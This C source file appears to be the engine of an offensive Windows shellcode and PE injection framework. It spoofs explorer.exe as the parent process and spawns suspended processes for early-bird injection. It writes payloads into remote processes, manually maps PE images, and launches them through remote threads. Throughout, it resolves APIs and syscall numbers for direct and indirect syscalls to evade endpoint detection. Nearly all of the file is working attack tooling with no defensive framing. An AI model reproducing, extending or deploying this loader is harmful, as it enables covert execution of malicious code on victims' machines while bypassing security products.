#include "engine.h"
#include "ps-utils.h"
#include "peb-eat-utils.h"
#include "syscall-utils.h"

#include <stdio.h>

static LOCAL_LOADER_CONTEXT g_EnvContext = { 0 };

// DFR function pointers (kernel32)
static P_VirtualAllocEx      g_VirtualAllocEx      = NULL;
static P_VirtualProtectEx    g_VirtualProtectEx    = NULL;
static P_WriteProcessMemory  g_WriteProcessMemory  = NULL;
static P_CreateRemoteThread  g_CreateRemoteThread  = NULL;
static P_WaitForSingleObject g_WaitForSingleObject = NULL;

// indirect syscall SSNs
DWORD    wNtAllocateVirtualMemorySSN      = 0;
DWORD    wNtProtectVirtualMemorySSN       = 0;
DWORD    wNtWriteVirtualMemorySSN         = 0;
DWORD    wNtCreateThreadExSSN             = 0;
DWORD    wNtWaitForSingleObjectSSN        = 0;
DWORD    wNtQueueApcThreadSSN             = 0;
DWORD    wNtResumeThreadSSN               = 0;

// function addresses
UINT_PTR sysAddrNtAllocateVirtualMemory   = 0;
UINT_PTR sysAddrNtProtectVirtualMemory    = 0;
UINT_PTR sysAddrNtWriteVirtualMemory      = 0;
UINT_PTR sysAddrNtCreateThreadEx          = 0;
UINT_PTR sysAddrNtWaitForSingleObject     = 0;
UINT_PTR sysAddrNtQueueApcThread          = 0;
UINT_PTR sysAddrNtResumeThread            = 0;

#ifdef _WIN64
#define RELOC_TYPE IMAGE_REL_BASED_DIR64
#else
#define RELOC_TYPE IMAGE_REL_BASED_HIGHLOW
#endif

static BOOL IsPayloadPE(LPCVOID pPayload) {
    if (!pPayload) return FALSE;

    const BYTE *pRaw = (const BYTE *)pPayload;
    const IMAGE_DOS_HEADER *pDos = (const IMAGE_DOS_HEADER *)pRaw;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    const IMAGE_NT_HEADERS *pNt =
        (const IMAGE_NT_HEADERS *)(pRaw + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    return TRUE;
}

BOOL ManualMapWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor) {
    if (!ctx || !pPayload || ctx->pRemoteAddress == NULL) return FALSE;

    PBYTE pRaw  = (PBYTE)pPayload;
    PBYTE pDest = (PBYTE)ctx->pRemoteAddress;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pRaw;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNtHeaders =
        (PIMAGE_NT_HEADERS)(pRaw + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    // 2. Write headers
    if (ctx->hProcess == (HANDLE)-1) {
        __try {
            memcpy(pDest, pRaw, pNtHeaders->OptionalHeader.SizeOfHeaders);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return FALSE;
        }
    } else {
        SIZE_T written = 0;
        if (!WriteProcessMemory(ctx->hProcess,
                                pDest,
                                pRaw,
                                pNtHeaders->OptionalHeader.SizeOfHeaders,
                                &written)) {
            return FALSE;
        }
    }

    // 3. Sections
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSection[i].SizeOfRawData == 0) continue;

        PBYTE pSectionDest = pDest + pSection[i].VirtualAddress;
        PBYTE pSectionSrc  = pRaw  + pSection[i].PointerToRawData;

        if (ctx->hProcess == (HANDLE)-1) {
            __try {
                memcpy(pSectionDest, pSectionSrc, pSection[i].SizeOfRawData);
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                return FALSE;
            }
        } else {
            SIZE_T written = 0;
            if (!WriteProcessMemory(ctx->hProcess,
                                    pSectionDest,
                                    pSectionSrc,
                                    pSection[i].SizeOfRawData,
                                    &written)) {
                return FALSE;
            }
        }
    }

    // 4. Relocations (local only)
    ULONG_PTR delta = (ULONG_PTR)pDest - pNtHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir =
            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        if (relocDir.VirtualAddress != 0 &&
            relocDir.Size > 0 &&
            ctx->hProcess == (HANDLE)-1) {

            PIMAGE_BASE_RELOCATION pRelocBlock =
                (PIMAGE_BASE_RELOCATION)(pDest + relocDir.VirtualAddress);

            while (pRelocBlock->VirtualAddress != 0 &&
                   pRelocBlock->SizeOfBlock > 0) {

                DWORD entryCount =
                    (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
                    sizeof(WORD);

                PWORD pEntries =
                    (PWORD)((PBYTE)pRelocBlock + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD i = 0; i < entryCount; i++) {
                    WORD type   = pEntries[i] >> 12;
                    WORD offset = pEntries[i] & 0x0FFF;

                    if (type == RELOC_TYPE) {
                        ULONG_PTR *pPatchTarget =
                            (ULONG_PTR *)(pDest +
                                          pRelocBlock->VirtualAddress +
                                          offset);
                        *pPatchTarget += delta;
                    }
                }

                pRelocBlock =
                    (PIMAGE_BASE_RELOCATION)((PBYTE)pRelocBlock +
                                             pRelocBlock->SizeOfBlock);
            }
        }
    }

    return TRUE;
}

BOOL InitializeResolvers(SYSCALL_FLAVOR flavor) {
    if (flavor == FLAVOR_DFR) {
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (!hKernel32) {
            printf("[ERROR] Failed to get kernel32.dll\n");
            return FALSE;
        }

        g_VirtualAllocEx =
            (P_VirtualAllocEx)GPAManualByName(hKernel32, "VirtualAllocEx");
        g_WriteProcessMemory =
            (P_WriteProcessMemory)GPAManualByName(hKernel32, "WriteProcessMemory");
        g_VirtualProtectEx =
            (P_VirtualProtectEx)GPAManualByName(hKernel32, "VirtualProtectEx");
        g_CreateRemoteThread =
            (P_CreateRemoteThread)GPAManualByName(hKernel32, "CreateRemoteThread");
        g_WaitForSingleObject =
            (P_WaitForSingleObject)GPAManualByName(hKernel32, "WaitForSingleObject");

        if (!g_VirtualAllocEx || !g_WriteProcessMemory ||
            !g_VirtualProtectEx || !g_CreateRemoteThread || !g_WaitForSingleObject) {
            printf("[ERROR] DFR resolver failed.\n");
            return FALSE;
        }

        return TRUE;
    }

    if (flavor == FLAVOR_INDIRECT) {
#if defined(_WIN64)
        PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
        PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

        g_EnvContext.wNtAllocateVirtualMemorySSN = GetSSNByName(pPeb, "NtAllocateVirtualMemory");
        g_EnvContext.wNtProtectVirtualMemorySSN = GetSSNByName(pPeb, "NtProtectVirtualMemory");
        g_EnvContext.wNtWriteVirtualMemorySSN = GetSSNByName(pPeb, "NtWriteVirtualMemory");

        printf("[+] Indirect SSNs loaded.\n");

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        printf("[+] Resolving addresses.\n");
        if (hNtdll) {
            g_EnvContext.sysAddrNtAllocateVirtualMemory =
                (UINT_PTR)GetSyscallAddress(
                    GPAManualByName(hNtdll, "NtAllocateVirtualMemory"));
            g_EnvContext.sysAddrNtProtectVirtualMemory =
                (UINT_PTR)GetSyscallAddress(
                    GPAManualByName(hNtdll, "NtProtectVirtualMemory"));
            g_EnvContext.sysAddrNtWriteVirtualMemory =
                (UINT_PTR)GetSyscallAddress(
                    GPAManualByName(hNtdll, "NtWriteVirtualMemory"));
        } else {
            printf("[!] ERROR: Failed to resolve addresses.\n");
        }
        printf("[+] Done resolving addresses.\n");

        // Bridge values into globals used by indirect-syscalls.asm
        wNtAllocateVirtualMemorySSN    = g_EnvContext.wNtAllocateVirtualMemorySSN;
        wNtProtectVirtualMemorySSN     = g_EnvContext.wNtProtectVirtualMemorySSN;
        wNtWriteVirtualMemorySSN       = g_EnvContext.wNtWriteVirtualMemorySSN;

        sysAddrNtAllocateVirtualMemory = g_EnvContext.sysAddrNtAllocateVirtualMemory;
        sysAddrNtProtectVirtualMemory  = g_EnvContext.sysAddrNtProtectVirtualMemory;
        sysAddrNtWriteVirtualMemory    = g_EnvContext.sysAddrNtWriteVirtualMemory;

        // Additional indirect syscalls your ASM expects
        wNtCreateThreadExSSN           = GetSSNByName(pPeb, "NtCreateThreadEx");
        wNtWaitForSingleObjectSSN      = GetSSNByName(pPeb, "NtWaitForSingleObject");
        wNtQueueApcThreadSSN           = GetSSNByName(pPeb, "NtQueueApcThread");
        wNtResumeThreadSSN             = GetSSNByName(pPeb, "NtResumeThread");

        sysAddrNtCreateThreadEx        = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtCreateThreadEx"));
        sysAddrNtWaitForSingleObject   = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWaitForSingleObject"));
        sysAddrNtQueueApcThread        = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtQueueApcThread"));
        sysAddrNtResumeThread          = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtResumeThread"));

        printf("[+] SSNs Loaded: NtAllocateVirtualMemory(0x%X), NtWriteVirtualMemory(0x%X), NtProtectVirtualMemory(0x%X), NtCreateThreadEx(0x%X), NtWaitForSingleObject(0x%X)\n",
            wNtAllocateVirtualMemorySSN, wNtWriteVirtualMemorySSN, wNtProtectVirtualMemorySSN, wNtCreateThreadExSSN, wNtWaitForSingleObjectSSN);

        return TRUE;
    }

    return TRUE;
}

BOOL InitializeTarget(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
    if (ctx->spawnPath) {
#ifndef REFLECTIVE_PAYLOAD
        STARTUPINFOEXA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        SIZE_T attributeSize = 0;

        DWORD parentPid = FindPidByName(L"explorer.exe");
        if (parentPid == 0) return FALSE;

        HANDLE hParent =
            OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
        if (!hParent) return FALSE;

        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
        si.lpAttributeList =
            (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0,
                                                    attributeSize);
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0,
                                          &attributeSize);
        UpdateProcThreadAttribute(si.lpAttributeList, 0,
                                  PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                  &hParent, sizeof(HANDLE), NULL, NULL);

        DWORD startupFlags = EXTENDED_STARTUPINFO_PRESENT;
        if (ctx->technique == EARLY_BIRD) {
            startupFlags |= CREATE_SUSPENDED;
        }

        if (!CreateProcessA(NULL,
                            ctx->spawnPath,
                            NULL,
                            NULL,
                            FALSE,
                            startupFlags,
                            NULL,
                            NULL,
                            &si.StartupInfo,
                            &pi)) {
            DeleteProcThreadAttributeList(si.lpAttributeList);
            HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
            CloseHandle(hParent);
            return FALSE;
        }

        ctx->hProcess = pi.hProcess;
        ctx->hThread  = pi.hThread;

        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParent);

        return TRUE;
#else
        return FALSE;
#endif
    }

    if (ctx->targetPid == 0) {
        printf("[*] No PID, using current process.\n");
        ctx->hProcess = (HANDLE)-1;
    } else {
#ifndef REFLECTIVE_PAYLOAD
        ctx->hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ctx->targetPid);
#endif
    }

    return ctx->hProcess != NULL;
}

BOOL DefaultAllocate(PINJECTION_CONTEXT ctx, DWORD protect, SYSCALL_FLAVOR flavor) {
    if (flavor == FLAVOR_WIN32) {
        if (ctx->hProcess == (HANDLE)-1)
            ctx->pRemoteAddress = VirtualAlloc(NULL,
                                               ctx->payloadSize,
                                               MEM_COMMIT | MEM_RESERVE,
                                               protect);
        else
            ctx->pRemoteAddress = VirtualAllocEx(ctx->hProcess,
                                                 NULL,
                                                 ctx->payloadSize,
                                                 MEM_COMMIT | MEM_RESERVE,
                                                 protect);
        return ctx->pRemoteAddress != NULL;
    }

    if (flavor == FLAVOR_DFR) {
        if (!g_VirtualAllocEx) return FALSE;
        ctx->pRemoteAddress = g_VirtualAllocEx(ctx->hProcess,
                                               NULL,
                                               ctx->payloadSize,
                                               MEM_COMMIT | MEM_RESERVE,
                                               protect);
        return ctx->pRemoteAddress != NULL;
    }

    if (flavor == FLAVOR_DIRECT) {
        PVOID baseAddr = NULL;
        SIZE_T regionSize = ctx->payloadSize;
        NTSTATUS status = SysNtAllocateVirtualMemory(ctx->hProcess,
                                                     &baseAddr,
                                                     0,
                                                     &regionSize,
                                                     MEM_COMMIT | MEM_RESERVE,
                                                     protect);
        if (status == 0) {
            ctx->pRemoteAddress = baseAddr;
            return TRUE;
        }
        return FALSE;
    }

    if (flavor == FLAVOR_INDIRECT) {
        printf("[*] Running Allocation with Indirect API calls.\n");
        NTSTATUS status = IndirectSysNtAllocateVirtualMemory(
            ctx->hProcess,
            &ctx->pRemoteAddress,
            0,
            &ctx->payloadSize,
            MEM_COMMIT | MEM_RESERVE,
            protect);
        printf("[*] Done running Indirect API allocation.\n");
        return (status == 0);
    }

    return FALSE;
}

BOOL DefaultProtect(PINJECTION_CONTEXT ctx,
                    DWORD targetProtect,
                    PDWORD pOldProtect,
                    SYSCALL_FLAVOR flavor) {
    if (flavor == FLAVOR_WIN32) {
        if (ctx->hProcess == (HANDLE)-1)
            return VirtualProtect(ctx->pRemoteAddress,
                                  ctx->payloadSize,
                                  targetProtect,
                                  pOldProtect);
        else
            return VirtualProtectEx(ctx->hProcess,
                                    ctx->pRemoteAddress,
                                    ctx->payloadSize,
                                    targetProtect,
                                    pOldProtect);
    }

    if (flavor == FLAVOR_DFR) {
        if (!g_VirtualProtectEx) return FALSE;
        return g_VirtualProtectEx(ctx->hProcess,
                                  ctx->pRemoteAddress,
                                  ctx->payloadSize,
                                  targetProtect,
                                  pOldProtect);
    }

    if (flavor == FLAVOR_DIRECT) {
        ULONG oldProt = 0;
        PVOID baseAddr = ctx->pRemoteAddress;
        SIZE_T regionSize = ctx->payloadSize;
        NTSTATUS status = SysNtProtectVirtualMemory(ctx->hProcess,
                                                    &baseAddr,
                                                    &regionSize,
                                                    targetProtect,
                                                    &oldProt);
        if (pOldProtect) *pOldProtect = oldProt;
        return (status == 0);
    }

    if (flavor == FLAVOR_INDIRECT) {
        ULONG oldProt = 0;
        PVOID baseAddr = ctx->pRemoteAddress;
        SIZE_T regionSize = ctx->payloadSize;
        NTSTATUS status = IndirectSysNtProtectVirtualMemory(ctx->hProcess,
                                                            &baseAddr,
                                                            &regionSize,
                                                            targetProtect,
                                                            &oldProt);
        if (pOldProtect) *pOldProtect = oldProt;
        return (status == 0);
    }

    return FALSE;
}

BOOL DefaultWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor) {
    if (ctx->hProcess == (HANDLE)-1) {
        __try {
            memcpy(ctx->pRemoteAddress, pPayload, ctx->payloadSize);
            return TRUE;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return FALSE;
        }
    }

    if (flavor == FLAVOR_WIN32) {
        return WriteProcessMemory(ctx->hProcess,
                                  ctx->pRemoteAddress,
                                  (PVOID)pPayload,
                                  ctx->payloadSize,
                                  NULL);
    }

    if (flavor == FLAVOR_DFR) {
        if (!g_WriteProcessMemory) return FALSE;
        return g_WriteProcessMemory(ctx->hProcess,
                                    ctx->pRemoteAddress,
                                    (PVOID)pPayload,
                                    ctx->payloadSize,
                                    NULL);
    }

    if (flavor == FLAVOR_DIRECT) {
        ULONG oldProt = 0;
        DefaultProtect(ctx, PAGE_EXECUTE_READWRITE, &oldProt, flavor);

        SIZE_T bytesWritten = 0;
        NTSTATUS status = SysNtWriteVirtualMemory(ctx->hProcess,
                                                  ctx->pRemoteAddress,
                                                  (PVOID)pPayload,
                                                  ctx->payloadSize,
                                                  &bytesWritten);
        if (status != 0) return FALSE;

        ULONG tmp = 0;
        DefaultProtect(ctx, oldProt, &tmp, flavor);
        return (bytesWritten > 0);
    }

    if (flavor == FLAVOR_INDIRECT) {
        SIZE_T bytesWritten = 0;
        NTSTATUS status = IndirectSysNtWriteVirtualMemory(ctx->hProcess,
                                                          ctx->pRemoteAddress,
                                                          (PVOID)pPayload,
                                                          ctx->payloadSize,
                                                          &bytesWritten);
        return (status == 0 && bytesWritten > 0);
    }

    return FALSE;
}

BOOL DefaultInvoke(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
    if (ctx->enableStomping == FALSE) {
        DWORD oldProtect = 0;
        if (!DefaultProtect(ctx, PAGE_EXECUTE_READ, &oldProtect, flavor))
            return FALSE;
    }

    if (ctx->hProcess == (HANDLE)-1) {
        typedef void (*FnEntry)();
        FnEntry entry = (FnEntry)ctx->pRemoteAddress;
        entry();
        return TRUE;
    }

    if (flavor == FLAVOR_WIN32) {
        HANDLE hThread = CreateRemoteThread(ctx->hProcess,
                                            NULL,
                                            0,
                                            (LPTHREAD_START_ROUTINE)ctx->pRemoteAddress,
                                            NULL,
                                            0,
                                            NULL);
        ctx->hThread = hThread;
        return (hThread != NULL);
    }

    if (flavor == FLAVOR_DFR) {
        printf("[*] Using direct syscalls to invoke NtCreateThreadEx.\n");
        if (!g_CreateRemoteThread) return FALSE;
        HANDLE hThread = g_CreateRemoteThread(ctx->hProcess,
                                              NULL,
                                              0,
                                              (LPTHREAD_START_ROUTINE)ctx->pRemoteAddress,
                                              NULL,
                                              0,
                                              NULL);
        ctx->hThread = hThread;
        return (hThread != NULL);
    }

    if (flavor == FLAVOR_DIRECT) {
        printf("[*] Using direct syscalls to invoke NtCreateThreadEx.\n");
        NTSTATUS status = SysNtCreateThreadEx(&ctx->hThread,
                                              GENERIC_EXECUTE,
                                              NULL,
                                              ctx->hProcess,
                                              ctx->pRemoteAddress,
                                              NULL,
                                              FALSE,
                                              0,
                                              0,
                                              0,
                                              NULL);
        return (status == 0 && ctx->hThread != NULL);
    }

    if (flavor == FLAVOR_INDIRECT) {
        printf("[*] Using indirect syscalls to invoke NtCreateThreadEx.\n");
        NTSTATUS status = IndirectSysNtCreateThreadEx(&ctx->hThread,
                                                      GENERIC_EXECUTE,
                                                      NULL,
                                                      ctx->hProcess,
                                                      ctx->pRemoteAddress,
                                                      NULL,
                                                      FALSE,
                                                      0,
                                                      0,
                                                      0,
                                                      NULL);
        return (status == 0 && ctx->hThread != NULL);
    }

    return FALSE;
}

BOOL EngineExecute(PINJECTION_ENGINE engine,
                   PINJECTION_CONTEXT ctx,
                   LPCVOID pPayload,
                   SYSCALL_FLAVOR flavor,
                   DWORD finalProtect) {
    if (!engine ||
        !engine->Allocate ||
        !engine->Write ||
        !engine->Protect ||
        !engine->Invoke)
        return FALSE;

    printf("[*] Initializing target.\n");
    if (!InitializeTarget(ctx, flavor))
        return FALSE;

    printf("[*] Initializing resolvers.\n");
    if (flavor == FLAVOR_DFR || flavor == FLAVOR_INDIRECT)
        if (!InitializeResolvers(flavor))
            return FALSE;
    printf("[*] Resolver initialization complete.\n");

    printf("[*] Running Allocation.\n");
    if (!engine->Allocate(ctx, PAGE_READWRITE, flavor))
        return FALSE;

    printf("[*] Allocation complete.\n");
    if (IsPayloadPE(pPayload)) {
        printf("[*] Detected PE payload, using ManualMapWrite.\n");
        if (!ManualMapWrite(ctx, pPayload, flavor))
            return FALSE;
    } else {
        printf("[*] Detected raw payload, using DefaultWrite.\n");
        if (!engine->Write(ctx, pPayload, flavor))
            return FALSE;
    }

    printf("[*] Running Invoke.\n");
    return engine->Invoke(ctx, flavor);
}
